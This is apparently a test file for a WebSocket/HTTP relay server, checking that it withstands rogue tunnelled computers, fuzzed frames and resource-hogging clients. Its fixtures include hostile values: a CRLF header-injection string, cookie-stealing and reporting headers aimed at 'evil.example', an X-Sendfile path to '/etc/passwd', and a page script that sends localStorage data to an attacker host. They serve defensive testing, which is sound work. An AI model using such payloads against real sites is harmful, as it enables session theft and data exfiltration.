/**
 * The relay against those who mean it harm: a computer that breaks the
 * tunnel's rules or reaches for the other computers' site, a client that
 * takes more than its share. Whatever they send, the relay stays up — the
 * helpers fail any test in which something was thrown and not caught — and
 * everyone else is served as before.
 */
import { connect } from "node:net";
import { describe, expect, it } from "vitest";
import { WebSocket } from "ws";
import { WINDOW_BYTES } from "../src/index.js";
import { CLOSE, DATA, END, HEAD, NODE, OPEN, WINDOW, anyFrame, computer, echo, frame, json, numbers, relay, rogue, sockets, start, uint32, until } from "./helpers.js";

const GOOD = "node_good";
const ok = { status: 200, headers: [["Content-Type", "text/plain"]] };

/** The relay is up and passing things on: a well-behaved computer next door still answers. */
async function stillServes(base: string): Promise<void> {
  expect((await json(await fetch(`${base}/n/${GOOD}/v1/hello`))).path).toBe("/v1/hello");
}

/** Opens a WebSocket to the computer and says how it ended: closed with a code, or refused with a status. */
function socketEnding(path = "/v1/events", headers: Record<string, string> = {}): Promise<{ closed?: number; refused?: number }> {
  const client = new WebSocket(`ws://127.0.0.1:${relay.port}/n/${NODE}${path}`, { headers });
  sockets.push(client);
  client.on("error", () => {});
  return new Promise((resolve) => {
    client.on("close", (closed) => resolve({ closed }));
    client.on("unexpected-response", (_request, response) => resolve({ refused: response.statusCode }));
  });
}

/** Sends a request by hand, as no well-behaved client would, and gives back what came on the connection. */
function raw(request: string, then: "wait" | "reset" = "wait"): Promise<string> {
  return new Promise((resolve) => {
    let answer = "";
    const socket = connect(relay.port, "127.0.0.1", () => {
      socket.write(request);
      if (then === "reset") setTimeout(() => socket.resetAndDestroy(), 30);
    });
    socket.on("data", (chunk) => (answer += chunk));
    socket.on("error", () => {});
    socket.on("close", () => resolve(answer));
  });
}

describe("a computer that breaks the tunnel's rules", () => {
  const answers: [what: string, frames: (id: number) => Buffer[], client: number | "cut"][] = [
    ["a status that is not one (99)", (id) => [frame(HEAD, id, { status: 99, headers: [] })], 502],
    ["no headers", (id) => [frame(HEAD, id, { status: 200 })], 502],
    ["a second answer", (id) => [frame(HEAD, id, ok), frame(HEAD, id, ok)], "cut"],
    ["a header that breaks the line", (id) => [frame(HEAD, id, { status: 200, headers: [["X-A", "b\r\nSet-Cookie: c=d"]] })], 502],
    ["a WebSocket nobody asked for (101)", (id) => [frame(HEAD, id, { status: 101, headers: [] })], 502],
    ["its body before its headers", (id) => [frame(DATA, id, "early"), frame(HEAD, id, ok)], 502],
    ["more after it said that was all", (id) => [frame(HEAD, id, ok), frame(DATA, id, "all"), frame(END, id), frame(DATA, id, "more"), frame(HEAD, id, ok)], 200],
    ["an allowance it was never owed", (id) => [frame(WINDOW, id, uint32(0xffffffff))], 502],
    ["a stream of its own", (id) => [frame(OPEN, id, { kind: "http", method: "GET", path: "/", headers: [], client: "c" })], 502],
    ["nonsense", (id) => [frame(9, id, "?"), frame(HEAD, id, "{")], 502],
  ];

  it.each(answers)("answering a request with %s: that client is let down, the relay is not", async (_what, frames, expected) => {
    const base = await start();
    await computer(echo, { node: GOOD });
    await rogue((id, _request, send) => send(...frames(id)));
    const response = await fetch(`${base}/n/${NODE}/v1/hello`);
    if (expected === "cut") await expect(response.text()).rejects.toThrow();
    else expect(response.status).toBe(expected);
    await stillServes(base);
    // Nor was the tunnel of the computer that did it brought down: its next request is passed on like any other.
    expect((await fetch(`${base}/n/${NODE}/v1/again`)).status).toBe(expected === "cut" ? 200 : expected);
  });

  const upgrades: [what: string, frames: (id: number) => Buffer[], ending: { closed?: number; refused?: number }][] = [
    ["accepts it twice", (id) => [frame(HEAD, id, { status: 101, headers: [] }), frame(HEAD, id, { status: 101, headers: [] })], { closed: 1001 }],
    ["closes it with more words than a WebSocket carries", (id) => [frame(HEAD, id, { status: 101, headers: [] }), frame(CLOSE, id, { code: 1008, reason: "x".repeat(200) })], { closed: 1001 }],
    ["closes it with a code that is not one", (id) => [frame(HEAD, id, { status: 101, headers: [] }), frame(CLOSE, id, { code: 99999.5, reason: 7 })], { closed: 1001 }],
    ["closes it with a code it may not use", (id) => [frame(HEAD, id, { status: 101, headers: [] }), frame(CLOSE, id, { code: 1005, reason: "none" })], { closed: 1000 }],
    ["refuses it and never stops explaining why", (id) => [frame(HEAD, id, { status: 401, headers: [] }), ...Array.from({ length: 9 }, () => frame(DATA, id, Buffer.alloc(32 * 1024)))], { refused: 502 }],
    ["refuses it with a status that is not one", (id) => [frame(HEAD, id, { status: 20, headers: [] })], { refused: 502 }],
  ];

  it.each(upgrades)("asked for a WebSocket, it %s: that client is let down, the relay is not", async (_what, frames, ending) => {
    const base = await start();
    await computer(echo, { node: GOOD });
    await rogue((id, _request, send) => send(...frames(id)));
    expect(await socketEnding()).toEqual(ending);
    await stillServes(base);
  });

  it("cannot hold a client's stream with a refusal it never finishes: a window of it, no more", async () => {
    await start();
    let sent = 0;
    await rogue((id, _request, send) => {
      send(frame(HEAD, id, { status: 403, headers: [] }));
      const more = setInterval(() => {
        send(frame(DATA, id, Buffer.alloc(32 * 1024)));
        if ((sent += 32 * 1024) > 4 * WINDOW_BYTES) clearInterval(more);
      }, 1);
    });
    expect(await socketEnding()).toEqual({ refused: 502 });
    expect(sent).toBeLessThanOrEqual(WINDOW_BYTES + 64 * 1024);
  });

  it.each([1, 2, 3])("answering everyone with frames of every kind, well and badly formed: nothing throws, the others are served (seed %i)", async (seed) => {
    const base = await start();
    await computer(echo, { node: GOOD });
    const next = numbers(seed);
    const seen: number[] = [0];
    await rogue((id, _request, send) => {
      seen.push(id);
      // Mostly at the stream that was just opened, sometimes at its neighbours.
      for (let count = 1 + next(6); count > 0; count--) send(anyFrame(next, next(4) ? [id] : seen.slice(-8)));
    });
    const letDown = (): AbortSignal => AbortSignal.timeout(400);
    for (let round = 0; round < 15; round++) {
      const requests = Array.from({ length: 12 }, (_, index) =>
        fetch(`${base}/n/${NODE}/v1/${round}/${index}`, { method: index % 3 ? "GET" : "POST", body: index % 3 ? undefined : "x".repeat(index * 5000), signal: letDown() })
          .then((response) => response.arrayBuffer())
          .catch(() => null),
      );
      const upgrades = Array.from({ length: 3 }, () => {
        const client = new WebSocket(`ws://127.0.0.1:${relay.port}/n/${NODE}/v1/events`);
        sockets.push(client);
        client.on("error", () => {});
        client.on("open", () => client.send("hello"));
        return new Promise((resolve) => setTimeout(resolve, 300)).then(() => client.terminate());
      });
      const [good] = await Promise.all([fetch(`${base}/n/${GOOD}/v1/round/${round}`).then(json), ...requests, ...upgrades]);
      expect(good.path).toBe(`/v1/round/${round}`);
    }
    await stillServes(base);
  }, 30_000);
});

describe("a computer that reaches for the site it shares", () => {
  const reaching: [string, string][] = [
    ["Set-Cookie", "session=stolen; Path=/"],
    ["Set-Cookie", "second=one; Path=/n/"],
    ["Service-Worker-Allowed", "/"],
    ["Clear-Site-Data", '"storage"'],
    ["Strict-Transport-Security", "max-age=0"],
    ["Alt-Svc", 'h3="evil.example:443"'],
    ["NEL", '{"report_to":"spy","max_age":31536000,"success_fraction":1}'],
    ["Report-To", '{"group":"spy","max_age":31536000,"endpoints":[{"url":"https://evil.example/"}]}'],
    ["Reporting-Endpoints", 'spy="https://evil.example/"'],
    ["X-Accel-Redirect", "/internal/secrets"],
    ["X-Sendfile", "/etc/passwd"],
    ["X-Content-Type-Options", "whatever-you-guess"],
  ];
  const page = "<!doctype html><script>fetch('https://evil.example/?' + localStorage.length)</script>";

  /** A computer that answers everything with a page, and every header that reaches past it. */
  const reach = (): Promise<WebSocket | number> =>
    computer((stream, request) => {
      const status = request.kind === "ws" ? 401 : 200;
      stream.head({ status, headers: [["Content-Type", "text/html"], ["Content-Security-Policy", "script-src *"], ["X-Mine", "kept"], ["Content-Length", "5"], ...reaching] });
      void stream.write(Buffer.from(page)).then(() => stream.end());
      return { data: (_bytes, _text, passedOn) => passedOn(), close: () => {} };
    });

  it("has those headers held back, on a private relay as on an open one", async () => {
    for (const open of [false, true]) {
      const base = await start({ open });
      await reach();
      const response = await fetch(`${base}/n/${NODE}/v1/files/x`);
      for (const [name] of reaching.slice(0, -1)) expect([name, response.headers.get(name)]).toEqual([name, null]);
      expect(response.headers.getSetCookie()).toEqual([]);
      // What is its own to say passes, and the body is whole whatever length it claimed.
      expect([response.headers.get("x-mine"), response.headers.get("content-type"), await response.text()]).toEqual(["kept", "text/html", page]);
      // The relay's guards replace the computer's word: this answer is data, and a browser opening it runs nothing.
      expect(response.headers.get("x-content-type-options")).toBe("nosniff");
      expect(response.headers.get("content-security-policy")).toBe("default-src 'none'; frame-ancestors 'none'; sandbox");
      await relay.close();
    }
  });

  it("keeps its say over its own web app on a private relay, where the computers are the operator's", async () => {
    const base = await start();
    await reach();
    const response = await fetch(`${base}/n/${NODE}/`);
    expect([response.status, response.headers.get("content-security-policy"), await response.text()]).toEqual([200, "script-src *", page]);
    expect([response.headers.get("x-content-type-options"), response.headers.getSetCookie(), response.headers.get("service-worker-allowed")]).toEqual(["nosniff", [], null]);
  });

  it("has them held back from its refusal of a WebSocket as well", async () => {
    await start();
    await reach();
    const client = new WebSocket(`ws://127.0.0.1:${relay.port}/n/${NODE}/v1/events`);
    sockets.push(client);
    client.on("error", () => {});
    const headers = await new Promise<Record<string, unknown>>((resolve) => client.on("unexpected-response", (_request, response) => resolve(response.headers)));
    expect(headers).toMatchObject({ "x-mine": "kept", "x-content-type-options": "nosniff", "content-length": String(page.length) });
    for (const [name] of reaching.slice(0, -1)) expect(headers).not.toHaveProperty(name.toLowerCase());
  });

  it("is not given a client's cookies: they are for the relay's address, not for it", async () => {
    const base = await start();
    await computer(echo);
    const said = await json(await fetch(`${base}/n/${NODE}/v1/hello`, { headers: { Cookie: "session=of-another-site", Authorization: "Bearer device-token" } }));
    expect(Object.keys(said.headers).map((name) => name.toLowerCase())).not.toContain("cookie");
    expect(said.headers.Authorization).toBe("Bearer device-token");
  });
});

describe("a client that takes more than its share", () => {
  it("may hold some of a computer's streams, not all of them: the rest are for other addresses", async () => {
    const base = await start({ trustProxy: true });
    let waiting = 0;
    await computer((stream, request) => {
      if (request.path === "/v1/wait") waiting++;
      else return echo(stream, request);
      return { data: (_bytes, _text, passedOn) => passedOn(), close: () => waiting-- };
    });
    const greedy = { "X-Forwarded-For": "2001:db8:5:5::1" };
    const giveUp = new AbortController();
    for (let index = 0; index < 64; index++) void fetch(`${base}/n/${NODE}/v1/wait`, { headers: greedy, signal: giveUp.signal }).catch(() => null);
    await until(() => waiting === 64);

    // The sixty-fifth is refused at once — from that address, and from any other in the same IPv6 network.
    const refused = await fetch(`${base}/n/${NODE}/v1/hello`, { headers: greedy });
    expect([refused.status, (await json(refused)).error.code]).toEqual([429, "rate_limited"]);
    expect((await fetch(`${base}/n/${NODE}/v1/hello`, { headers: { "X-Forwarded-For": "2001:db8:5:5:ffff::2" } })).status).toBe(429);
    // A WebSocket takes a seat like any other connection.
    expect(await socketEnding("/v1/events", greedy)).toEqual({ refused: 429 });
    // Everyone else reaches the computer as before, and so does the greedy one on another computer.
    expect((await fetch(`${base}/n/${NODE}/v1/hello`, { headers: { "X-Forwarded-For": "2001:db8:5:6::1" } })).status).toBe(200);
    expect((await fetch(`${base}/n/node_elsewhere/v1/hello`, { headers: greedy })).status).toBe(502);

    // Its share comes back as it lets go.
    giveUp.abort();
    await until(() => waiting === 0);
    expect((await fetch(`${base}/n/${NODE}/v1/hello`, { headers: greedy })).status).toBe(200);
  });

  it("can send an address that is not one, and gets an answer rather than the relay's life", async () => {
    const base = await start();
    // `//` and `http://[` used to stop the relay; `%` alone is an address, only of a computer that is not there.
    for (const [target, status] of [["//", 400], ["http://[", 400], ["/n/x/%", 502]] as const) {
      const answer = await raw(`GET ${target} HTTP/1.1\r\nHost: relay\r\nConnection: close\r\n\r\n`);
      expect(answer.slice(0, 12)).toBe(`HTTP/1.1 ${status}`);
    }
    const upgrade = await raw("GET // HTTP/1.1\r\nHost: relay\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\n");
    expect(upgrade).toMatch(/^HTTP\/1\.1 404 /);
    expect((await fetch(`${base}/healthz`)).status).toBe(200);
  });

  it("can ask for a WebSocket and slam the door before the answer: nothing is left behind", async () => {
    const base = await start();
    const streams: string[] = [];
    await computer((stream, request) => {
      streams.push(`opened ${request.path}`);
      // The refusal comes late, to a connection that is no longer there.
      setTimeout(() => {
        stream.head({ status: 401, headers: [] });
        void stream.write(Buffer.from("{}")).then(() => stream.end());
      }, 150);
      return { data: (_bytes, _text, passedOn) => passedOn(), close: () => streams.push(`closed ${request.path}`) };
    });
    const upgrade = (path: string): string =>
      `GET /n/${NODE}${path} HTTP/1.1\r\nHost: relay\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\n`;
    await raw(upgrade("/v1/reset"), "reset");
    // The same for one that is refused on the spot: the answer is written to a connection being reset.
    for (let attempt = 0; attempt < 20; attempt++) await raw(upgrade("/nowhere").replace(`/n/${NODE}`, "/n/node_absent"), "reset");
    await until(() => streams.includes("closed /v1/reset"));
    await new Promise((resolve) => setTimeout(resolve, 200));
    expect((await fetch(`${base}/healthz`)).status).toBe(200);
  });

  it("can get the WebSocket handshake wrong after the computer said yes: its stream is not left open", async () => {
    await start();
    const streams: string[] = [];
    await computer((stream) => {
      stream.head({ status: 101, headers: [] });
      streams.push("accepted");
      return { data: (_bytes, _text, passedOn) => passedOn(), close: () => streams.push("closed") };
    });
    // An upgrade without the key that makes it a WebSocket handshake.
    const answer = await raw(`GET /n/${NODE}/v1/events HTTP/1.1\r\nHost: relay\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\n\r\n`);
    expect(answer).toMatch(/^HTTP\/1\.1 400 /);
    await until(() => streams.length === 2);
    expect(streams).toEqual(["accepted", "closed"]);
  });
});
